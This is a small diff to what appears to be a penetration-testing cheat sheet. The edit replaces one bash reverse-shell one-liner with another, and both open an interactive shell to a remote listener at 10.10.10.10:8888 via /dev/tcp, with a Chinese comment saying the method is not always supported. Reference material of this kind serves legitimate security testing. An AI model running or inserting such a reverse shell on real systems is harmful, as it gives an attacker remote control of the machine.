@@ -25,7 +25,7 @@ topics = ["Pentest"]
 
 ### 0x02 Bash
 ```
-/bin/bash -i >& /dev/tcp/10.10.10.10/8888 0>&1
+bash -i >& /dev/tcp/10.10.10.10/8888 0>&1
 注：这个由解析shell的bash完成，有些时候不支持
 ```
 
